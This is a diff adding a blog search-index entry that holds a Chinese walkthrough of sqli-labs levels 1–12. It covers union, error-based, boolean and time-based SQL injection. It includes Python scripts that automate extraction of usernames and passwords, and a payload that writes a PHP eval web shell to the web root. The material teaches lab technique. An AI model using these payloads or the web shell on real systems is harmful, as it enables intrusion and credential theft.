@@ -1,6 +1,803 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>sql-labs刷题</title>
+    <url>/2020/09/26/sql-labs/</url>
+    <content><![CDATA[<h2 id="No-1【单引号字符型】"><a href="#No-1【单引号字符型】" class="headerlink" title="No.1【单引号字符型】"></a>No.1【单引号字符型】</h2><p>我们输入?id=2-1发现回显<strong>第二个</strong>数据</p>
+<p>我们输入?id=1’发现回显错误：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1			&#x2F;&#x2F;最外面两个单引号相当于没有</span><br><span class="line">&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>可推断出后台的sql语句类似于<strong>字符型注入</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">SELECT * FROM xxx WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>字符型传入sql的代码类似于 SELECT * FROM xxx WHERE id=’2-1’ LIMIT 0,1，2-1会被当成字符来查询，从而取符号之前的2</p>
+</blockquote>
+<p>于是我们可以构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM xxx WHERE id&#x3D;&#39;$id&#39; order by n --+&#39; LIMIT 0,1</span><br><span class="line">即?id&#x3D;1&#39; order by n --+</span><br></pre></td></tr></table></figure>
+
+<p>通过改变n的个数来确定字段的个数，因为order by n相当于以第n列为标准排序，当n大于字段个数时候，就会报错，类似于：</p>
+<p><img src="/2020/09/26/sql-labs/1_1.png" alt="1_1"></p>
+<p>接着利用这张表开始一步步爆破就好了</p>
+<p><img src="/2020/09/26/sql-labs/1_2.png" alt="1_2"></p>
+<p>首先爆出库名：[security]</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,database(),3 --+		&#x2F;&#x2F;其中union后面的字段数要和之前的字段列数相等</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+<p>接着爆出表名：【users】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
+
+<p>接着爆出列名：【id, username, password】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>
+
+<p>最后爆出内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p>就得到了：</p>
+<p><img src="/2020/09/26/sql-labs/1_3.png" alt="1_3"></p>
+<h2 id="No-2【数字型】"><a href="#No-2【数字型】" class="headerlink" title="No.2【数字型】"></a>No.2【数字型】</h2><p>输入?id=2-1,得到第一列的结果</p>
+<blockquote>
+<p>为什么不能用?id=1+1测试？</p>
+<p>因为+在php里会被当成连接两个字符的连接符</p>
+<p>测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源代码：</span><br><span class="line">&lt;?php</span><br><span class="line">	$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">	$id&#x3D;&quot;id&#x3D;$id&quot;;</span><br><span class="line">	echo $id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>?id=1+1得到</p>
+<p><img src="/2020/09/26/sql-labs/2_1.png" alt="2_1"></p>
+<p>?id=2-1得到</p>
+<p><img src="/2020/09/26/sql-labs/2_2.png" alt="2_2"></p>
+</blockquote>
+<p>输入?id=1’，得到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>输入?id=1 –+，回显正常</p>
+<p>推断后台代码为<strong>数字型</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">SELECT * FROM xxx WHERE id&#x3D;$id LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>数字型传入sql的代码类似于 SELECT * FROM xxx WHERE id=2-1 LIMIT 0,1，2-1会被当成数字1来查询</p>
+</blockquote>
+<p>于是接下来类似No.1这样注入就可以了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>对于字符型和数字型，有如下测试</p>
+<p><img src="/2020/09/26/sql-labs/2_3.png" alt="2_3"></p>
+</blockquote>
+<h2 id="No-3【-‘-id’-】"><a href="#No-3【-‘-id’-】" class="headerlink" title="No.3【 (‘$id’) 】"></a>No.3【 (‘$id’) 】</h2><p>输入?id=2-1回显第二列</p>
+<p>输入?id=1’报错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39;1&#39;&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>推断为字符型注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">SELECT * FROM xxx WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>于是输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;) --+</span><br></pre></td></tr></table></figure>
+
+<p>成功回显第一列</p>
+<p>那么接下来就按照前两种方法注入就行了，类似于：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="No-4【-“-id”-】"><a href="#No-4【-“-id”-】" class="headerlink" title="No.4【 (“$id”) 】"></a>No.4【 (“$id”) 】</h2><p>这题我先摆上源码吧，比较难顶</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>输入?id=1”报错，类似于有一个双引号找不到匹配的双引号</p>
+<p><img src="/2020/09/26/sql-labs/4_2.png" alt="4_2"></p>
+<p>输入?id=1’不报错，类似于sql把双引号里的看作字符，那么1’就相当于1</p>
+<p><img src="/2020/09/26/sql-labs/4_1.png" alt="4_1"></p>
+<p>输入?id=1’)也不报错，类似于之前1’</p>
+<p><img src="/2020/09/26/sql-labs/4_3.png" alt="4_3"></p>
+<h3 id="发现1"><a href="#发现1" class="headerlink" title="发现1"></a>发现1</h3><blockquote>
+<p>事实上，在(“1’)”)第一个右括号之后加任何奇怪的字符，都不会报错，因为’)之后的全部省略了</p>
+<p><img src="/2020/09/26/sql-labs/4_4.png" alt="4_4"></p>
+</blockquote>
+<p>至于这道题的解法，那和之前类似，即</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="No-5【报错型注入】"><a href="#No-5【报错型注入】" class="headerlink" title="No.5【报错型注入】"></a>No.5【报错型注入】</h2><p>输入?id=1发现不回显</p>
+<p>输入?id=1’报错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>是单引号字符注入，但是不回显就很难受</p>
+<p>基本的注入点就是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="floor报错注入原理分析"><a href="#floor报错注入原理分析" class="headerlink" title="floor报错注入原理分析"></a>floor报错注入原理分析</h3><p>首先创建一张测试表</p>
+<p><img src="/2020/09/26/sql-labs/5_1.png" alt="5_1"></p>
+<p>然后我们以age为主键进行分类</p>
+<p><img src="/2020/09/26/sql-labs/5_2.png" alt="5_2"></p>
+<p>再创造一个能生成伪随机数的语句</p>
+<p><img src="/2020/09/26/sql-labs/5_3.png" alt="5_3"></p>
+<p>于是可以构造：</p>
+<p><img src="/2020/09/26/sql-labs/5_4.png" alt="5_4"></p>
+<p>发现报错爆出了数据表的名字，那么为什么会产生“ Duplicate entry ‘test1’ for key ‘<group_key>‘ ”的错误呢？</group_key></p>
+<blockquote>
+<p>group by的工作原理</p>
+<ol>
+<li><p>首先，创造一张空的表</p>
+<table>
+<thead>
+<tr>
+<th>count(*)</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>扫描原始表，x进行了第一次运算，按照上上个图片知道x的结果是test0</p>
+</li>
+<li><p>在空表里进行查询，发现无test0字段，于是准备进行插入</p>
+</li>
+<li><p>插入时需要知道插入什么，于是x进行第二次运算，x=test1</p>
+<table>
+<thead>
+<tr>
+<th>count(*)</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>test1</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>继续扫描原始表，进行第三次运算，x=test1，而此时test1已经存在于是插入</p>
+<table>
+<thead>
+<tr>
+<th>count(*)</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>test1</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>继续扫描原始表，进行第四次运算，x=test0，这个最终表里没有，所以准备插入test0</p>
+</li>
+<li><p>插入时再次进行运算【第五次】，x=test1。可是发现test1已经存在于最终表里了，于是系统不晓得怎么办，即报错了。</p>
+</li>
+</ol>
+</blockquote>
+<p>知道了这些原理我们就可以开始sql注入了【还是要注意列数的相匹配，原来有三列，而计数只有count(*)和x两列，所以要加一列】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x --+</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x)a --+</span><br><span class="line">&#x2F;*没有这个a会报错“Every derived table must have its own alias”，大概意思就是from后面当成了一个表，而这个表如果不加a相当于没有名字*&#x2F;</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.schemata group by x --+</span><br></pre></td></tr></table></figure>
+
+<p>但是第三种有个严重的问题就是group_concat只能读64个字符，不一定读的全：</p>
+<p><img src="/2020/09/26/sql-labs/5_5.png" alt="5_5"></p>
+<p>显然最后一个单词就没读全</p>
+<p>我们想到可不可以去掉group_concat()呢？</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select schema_name from information_schema.schemata),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/5_6.png" alt="5_6"></p>
+<p>显然是不行的，那么我们可以使用limit 0,1来一个个输出这些数据，改变n的值一个个试试出库名【security】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select schema_name from information_schema.schemata limit n,1),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>
+
+<p>爆出表名【users】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>
+
+<p>爆出列名【id，username，password】，可以在中间加个@，使得结果id@1更清楚</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),&#39;@&#39;,floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>
+
+<p>爆出字段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select password from security.users limit 0,1),&#39;@&#39;,floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>
+
+<p>而对于这种麻烦的工作我们可以写脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-5'</span></span><br><span class="line">column = [<span class="string">'username'</span>,<span class="string">'password'</span>]</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">"No."</span> +str(i)+ <span class="string">":"</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">		payload = <span class="string">"?id=-1' union select 1,count(*),concat((select "</span> +column[j]+ <span class="string">" from security.users limit "</span> + str(i) + <span class="string">",1),'@',floor(rand(0)*2))x from information_schema.schemata group by x  --+"</span></span><br><span class="line">		r = requests.get(url+payload)</span><br><span class="line">		con = r.text</span><br><span class="line">		start = con.find(<span class="string">'Duplicate entry'</span>)</span><br><span class="line">		end = con.find(<span class="string">'for key'</span>)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> start==<span class="number">-1</span>:</span><br><span class="line">			flag=<span class="number">0</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(con[start+<span class="number">17</span>:end<span class="number">-4</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="updatexml-XML-document-XPath-string-new-value-报错注入"><a href="#updatexml-XML-document-XPath-string-new-value-报错注入" class="headerlink" title="updatexml(XML_document, XPath_string, new_value)报错注入"></a>updatexml(XML_document, XPath_string, new_value)报错注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select(database())),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/5_7.png" alt="5_7"></p>
+<p>updatexml也是限制了32位的字符输出，我们还是利用limit n,1慢慢爆出表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>假如该题还限制了空格的输入，那么我们还可以这样：(括号代替空格，like代替=)【limit 0,1不太知道怎么替换】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;security&#39;)limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="截取部分回显结果以无视长度限制"><a href="#截取部分回显结果以无视长度限制" class="headerlink" title="截取部分回显结果以无视长度限制"></a>截取部分回显结果以无视长度限制</h4><p>如果说一个字段的长度就已经超过了updatexml最大的32字符了怎么办呢，我们可以使用left(str,n)/right(str,n)来读取，比如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;^updatexml(1,concat(0x7e,(select(right(table_name,30))from(information_schema.tables)where(table_schema)like(&#39;security&#39;)limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/5_8.png" alt="5_8"></p>
+<p>后面发现用substring也是可以的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;xxx&#39;) and extractvalue(1,concat(0x7e,(select group_concat(substring(password,1,1)) from security.users),0x7e))#&amp;passwd&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/5_9.png" alt="5_9"></p>
+<h3 id="extractvalue-目标xml文档，xml路径"><a href="#extractvalue-目标xml文档，xml路径" class="headerlink" title="extractvalue(目标xml文档，xml路径)"></a>extractvalue(目标xml文档，xml路径)</h3><p>大体上和updatexml相似，只是少一个参数而已，类似于：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and extractvalue(1,concat(0x7e,(select(database())),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="No-6"><a href="#No-6" class="headerlink" title="No.6"></a>No.6</h2><p>和第五关一样，只是把<code>?id=-1&#39;</code> 改成了<code>?id=-1&quot;</code></p>
+<h2 id="No-7【输出到外部】"><a href="#No-7【输出到外部】" class="headerlink" title="No.7【输出到外部】"></a>No.7【输出到外部】</h2><p>还是先测试注入点</p>
+<p>?id=1正常</p>
+<p>?id=1 and 1=2也正常，说明不是数字型注入</p>
+<p>?id=1’发现报错</p>
+<p>?id=1”发现不报错</p>
+<p>那么接下来就以单引号为基础来找注入点</p>
+<blockquote>
+<p>为什么接下来就以单引号为基础来找注入点？</p>
+<p>以这道题为例</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>单引号围起来的地方，里面id数值之后所有除了单引号的符号都会被忽略，所有双引号后加东西是没有意义的。</p>
+</blockquote>
+<p>?id=1’)) –+发现正常回显，于是推测原语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/7_1.png" alt="7_1"></p>
+<p>想到可能要将回显结果输出到一个外部文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,database(),3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\test.txt&quot;--+</span><br><span class="line">&#x2F;* 一定记住要用\\而不是\，应该是要转义的原因 *&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>这样查看test.txt就可以看到</p>
+<p><img src="/2020/09/26/sql-labs/7_2.png" alt="7_2"></p>
+<p>可是正常情况下，我们不可能进到人家文件夹里看东西，如果那样的话，sql注入也没有意义了，于是我们想到写入一句话木马：【一句话外面的双引号不能少，单引号还真不行，因为包裹id就用的单引号，可能会产生一些错误】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>接着就可以连接蚁剑了</p>
+<p><img src="/2020/09/26/sql-labs/7_3.png" alt="7_3"></p>
+<h2 id="No-8"><a href="#No-8" class="headerlink" title="No.8"></a>No.8</h2><p>首先测试注入点，发现是单引号注入，然后尝试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>直接成功，但是这题也可以用布尔型注入和时间型注入。</p>
+<h2 id="No-9【时间型注入】"><a href="#No-9【时间型注入】" class="headerlink" title="No.9【时间型注入】"></a>No.9【时间型注入】</h2><p>这一关找注入点比较恼火，测试了单引号，双引号，括号等等的东西，都只返回一个“You are in…..”</p>
+<p>甚至<code>?id=1&#39; and 1=2 --+</code>这种类似于布尔型注入，都返回“You are in…..”</p>
+<p>于是这题就只能使用时间型注入了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if((ascii(substring((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit i,1),j,1))&gt;k),1,sleep(2)) --+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>解释下这个payload：</p>
+<p>选到了第i个字段以后，截取其中第j个字母【substring】，判断这个字母的ascii码是否大于k，如果大于k则正常返回页面，如果小于k则两秒后返回页面。</p>
+</blockquote>
+<p>然后这样未免有些太麻烦了，于是就写了个脚本【这里爆库和爆表和爆字段长度都不长，不需要limit，最后爆具体内容要用到】</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-9'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(0,10):</span></span><br><span class="line">	<span class="comment">#print("table" +str(i)+":")</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"?id=1' and if((ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),"</span> +str(j)+ <span class="string">",1))&gt;"</span> +str(k)+ <span class="string">"),1,sleep(2)) --+"</span></span><br><span class="line">		time1 = time.time()</span><br><span class="line">		r = requests.get(url + payload)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		use = time2 - time1</span><br><span class="line">		<span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">			<span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">				flag=<span class="number">0</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += chr(k)</span><br><span class="line">				print(res)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">					</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="No-10"><a href="#No-10" class="headerlink" title="No.10"></a>No.10</h2><p>这一关和第九关一样，就是注入点从?id=1’变成了?id=1”</p>
+<p>这块就补上No.9里差的最后一步要用limit的注入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-10'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	print(<span class="string">"password"</span> +str(i)+<span class="string">":"</span>)</span><br><span class="line">	flag = <span class="number">1</span></span><br><span class="line">	res = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">			payload = <span class="string">'?id=1" and if((ascii(substring((select password from security.users limit '</span> +str(i)+ <span class="string">',1),'</span> +str(j)+ <span class="string">',1))&gt;'</span> +str(k)+ <span class="string">'),1,sleep(2)) --+'</span></span><br><span class="line">			time1 = time.time()</span><br><span class="line">			r = requests.get(url + payload)</span><br><span class="line">			time2 = time.time()</span><br><span class="line">			use = time2 - time1</span><br><span class="line">			<span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">				<span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">					flag=<span class="number">0</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					res += chr(k)</span><br><span class="line">					print(res)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">					</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="No-11"><a href="#No-11" class="headerlink" title="No.11"></a>No.11</h2><p>这关开始就进入了带有登录框的sql注入了。</p>
+<p>一般这种输入框的后端请求数据库的格式都类似这样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们可以这样构造：</p>
+<p><img src="/2020/09/26/sql-labs/11_1.png" alt="11_1"></p>
+<p>就相当于</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>接下来其实就和前十关爆的核心方法差距不大了</p>
+<p>爆列数：【2正常，得知是2列】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; order by 3#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/11_2.png" alt="11_2"></p>
+<p>爆库：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select 1,database()#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/11_3.png" alt="11_3"></p>
+<p>爆表：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/11_4.png" alt="11_4"></p>
+<p>爆列：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/11_5.png" alt="11_5"></p>
+<p>爆具体字段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select group_concat(username),group_concat(password) from security.users#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/11_6.png" alt="11_6"></p>
+<h3 id="有趣发现1"><a href="#有趣发现1" class="headerlink" title="有趣发现1"></a>有趣发现1</h3><blockquote>
+<p><img src="/2020/09/26/sql-labs/11_7.png" alt="11_7"></p>
+<p>在group_concat函数里面用right()，每一个字段的长度都会被截取到3</p>
+</blockquote>
+<h2 id="No-12"><a href="#No-12" class="headerlink" title="No.12"></a>No.12</h2><p>这一关和No.11区别不大，只是注入点变成了<code>uname=admin&quot;)#&amp;passwd=123</code></p>
+<h3 id="有趣的发现2"><a href="#有趣的发现2" class="headerlink" title="有趣的发现2"></a>有趣的发现2</h3><blockquote>
+<p>还有就是总结一下，后端请求sql语句用了什么哪种引号，只有注入时测试带这种引号的注入点才能成功，比如这题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</span><br><span class="line">$passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;($uname) and password&#x3D;($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
